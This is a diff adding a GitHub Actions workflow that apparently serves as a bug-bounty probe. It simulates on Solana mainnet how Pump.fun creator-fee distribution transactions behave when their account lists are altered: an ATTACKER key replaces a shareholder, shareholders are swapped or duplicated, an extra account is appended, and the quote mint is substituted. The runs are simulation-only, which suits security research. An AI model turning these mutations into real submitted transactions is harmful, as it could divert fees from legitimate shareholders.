@@ -1,0 +1,65 @@
+name: distribute-creator-runtime-differential
+on:
+  push:
+    paths:
+      - '.github/workflows/distribute-creator-runtime-differential.yml'
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-sdk@1.36.0 @solana/web3.js @solana/spl-token bn.js
+      - name: Simulation-only exact distribution differentials
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import fs from 'node:fs';
+          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import {NATIVE_MINT,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID} from '@solana/spl-token';
+          import * as p from '@pump-fun/pump-sdk';
+
+          const RPC='https://api.mainnet-beta.solana.com', c=new Connection(RPC,'confirmed'), online=new p.OnlinePumpSdk(c);
+          const MINT=new PublicKey('DSbo9t1p4tsch4PvCLSp1VLZEoSbKEqrAXaGP5ajpump');
+          const ATTACKER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const SHARING=p.feeSharingConfigPda(MINT), CREATOR_VAULT=p.creatorVaultPda(SHARING), BC=p.bondingCurvePda(MINT);
+          const shareInfo=await c.getAccountInfo(SHARING,'confirmed');if(!shareInfo)throw Error('sharing config missing');
+          const sharing=p.PUMP_SDK.decodeSharingConfig(shareInfo);
+          const bc=await online.fetchBondingCurve(MINT);
+          const creatorVaultInfo=await c.getAccountInfo(CREATOR_VAULT,'confirmed');
+          const safe=v=>{if(v==null)return v;if(typeof v==='bigint')return v.toString();if(v?.toBase58)return v.toBase58();if(v?.toString&&v.constructor?.name==='BN')return v.toString();if(Array.isArray(v))return v.map(safe);if(typeof v==='object'){const o={};for(const [k,z] of Object.entries(v))o[k]=safe(z);return o}return v};
+          console.log('CONTEXT',JSON.stringify({mint:MINT.toBase58(),bondingCurve:BC.toBase58(),bondingCurveDecoded:safe(bc),sharingConfig:SHARING.toBase58(),sharing:safe(sharing),creatorVault:CREATOR_VAULT.toBase58(),creatorVaultLamports:creatorVaultInfo?.lamports??null},null,2));
+          const idl=JSON.parse(fs.readFileSync('node_modules/@pump-fun/pump-sdk/src/idl/pump.json','utf8'));
+          for(const n of ['distribute_creator_fees','distribute_creator_fees_v2','get_minimum_distributable_fee']){const x=idl.instructions.find(i=>i.name===n);console.log('IDL_ACCOUNTS',n,JSON.stringify({args:x?.args,accounts:x?.accounts},null,2))}
+          try{const min=await online.getMinimumDistributableFee(MINT,ATTACKER);console.log('MINIMUM',JSON.stringify(safe(min),null,2))}catch(e){console.log('MINIMUM_FAIL',String(e).slice(0,1500))}
+          const built=await online.buildDistributeCreatorFeesInstructions(MINT);console.log('ONLINE_BUILD',JSON.stringify({isGraduated:built.isGraduated,instructionCount:built.instructions.length,instructions:built.instructions.map((ix,i)=>({i,program:ix.programId.toBase58(),data:Buffer.from(ix.data).toString('hex'),keys:ix.keys.map((k,j)=>({j,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable}))}))},null,2));
+          const canonicalDist=built.instructions.at(-1);
+          const shareholders=sharing.shareholders.map(x=>x.address);
+          const watch=[CREATOR_VAULT,...shareholders,ATTACKER];
+          function parse(logs){const t=(logs??[]).join('\n');return {account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|Shareholder|sharing|Distribute|Transfer|failed|success/i.test(x)).slice(-140)}}
+          async function sim(label,ixs,watchList=watch){const pre=await c.getMultipleAccountsInfo(watchList,'confirmed');const {blockhash}=await c.getLatestBlockhash('processed');const tx=new VersionedTransaction(new TransactionMessage({payerKey:ATTACKER,recentBlockhash:blockhash,instructions:ixs}).compileToV0Message());const raw=Buffer.from(tx.serialize()).toString('base64');const body={jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:watchList.map(x=>x.toBase58())}}]};const r=await fetch(RPC,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-distribute-diff/1.0'},body:JSON.stringify(body)});const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));const v=j.result.value,e=parse(v.logs),post=v.accounts??[];const states=watchList.map((pk,i)=>({pk:pk.toBase58(),preLamports:pre[i]?.lamports??null,postLamports:post[i]?.lamports??null,delta:pre[i]&&post[i]?(BigInt(post[i].lamports)-BigInt(pre[i].lamports)).toString():null}));console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,states,interesting:e.interesting},null,2));return {v,e,states}}
+          function replaceIx(ix,keys,data=ix.data){return new TransactionInstruction({programId:ix.programId,keys,data:Buffer.from(data)})}
+          function mutateRemaining(ix,fn){const fixed=ix.keys.length-shareholders.length,keys=ix.keys.map(k=>({...k}));fn(keys,fixed);return replaceIx(ix,keys)}
+
+          await sim('V1_CONTROL_online_full_sequence',built.instructions);
+          if(shareholders.length){
+            let m=mutateRemaining(canonicalDist,(keys,f)=>{keys[f].pubkey=ATTACKER});await sim('V1_REPLACE_FIRST_SHAREHOLDER_WITH_ATTACKER',[...built.instructions.slice(0,-1),m]);
+            if(shareholders.length>1){m=mutateRemaining(canonicalDist,(keys,f)=>{const z=keys[f].pubkey;keys[f].pubkey=keys[f+1].pubkey;keys[f+1].pubkey=z});await sim('V1_SWAP_FIRST_TWO_SHAREHOLDERS',[...built.instructions.slice(0,-1),m]);m=mutateRemaining(canonicalDist,(keys,f)=>{keys[f+1].pubkey=keys[f].pubkey});await sim('V1_DUPLICATE_FIRST_SHAREHOLDER',[...built.instructions.slice(0,-1),m])}
+            const extraKeys=canonicalDist.keys.map(k=>({...k}));extraKeys.push({pubkey:ATTACKER,isWritable:true,isSigner:false});await sim('V1_APPEND_EXTRA_ATTACKER',[...built.instructions.slice(0,-1),replaceIx(canonicalDist,extraKeys)]);
+          }
+
+          // V2 native-SOL sibling. Use same optional AMM->Pump pre-transfer from online builder, then v2 distribution.
+          const v2=await p.PUMP_SDK.distributeCreatorFeesV2({mint:MINT,sharingConfig:sharing,sharingConfigAddress:SHARING,quoteMint:NATIVE_MINT,payer:ATTACKER,shouldInitializeAta:true,quoteTokenProgram:TOKEN_PROGRAM_ID});
+          console.log('V2_BUILD',JSON.stringify({program:v2.programId.toBase58(),data:Buffer.from(v2.data).toString('hex'),keys:v2.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable}))},null,2));
+          const preTransfer=built.instructions.slice(0,-1);
+          await sim('V2_CONTROL_NATIVE',[...preTransfer,v2]);
+          // Derive fixed count from v2: native quote appends only shareholder system accounts.
+          const fixedV2=v2.keys.length-shareholders.length;
+          if(shareholders.length){let keys=v2.keys.map(k=>({...k}));keys[fixedV2].pubkey=ATTACKER;await sim('V2_REPLACE_FIRST_SHAREHOLDER_WITH_ATTACKER',[...preTransfer,replaceIx(v2,keys)]);if(shareholders.length>1){keys=v2.keys.map(k=>({...k}));const z=keys[fixedV2].pubkey;keys[fixedV2].pubkey=keys[fixedV2+1].pubkey;keys[fixedV2+1].pubkey=z;await sim('V2_SWAP_FIRST_TWO_SHAREHOLDERS',[...preTransfer,replaceIx(v2,keys)])}}
+          // Cross-quote mutation: change quote mint to USDC without supplying fabricated token balances; should be rejected by quote/bonding relation or vault derivation before value moves.
+          const USDC=new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');const quoteIdx=v2.keys.findIndex(k=>k.pubkey.equals(NATIVE_MINT));if(quoteIdx>=0){const keys=v2.keys.map(k=>({...k}));keys[quoteIdx].pubkey=USDC;await sim('V2_NATIVE_TO_USDC_QUOTE_SUBSTITUTION',[...preTransfer,replaceIx(v2,keys)])}
+          NODE
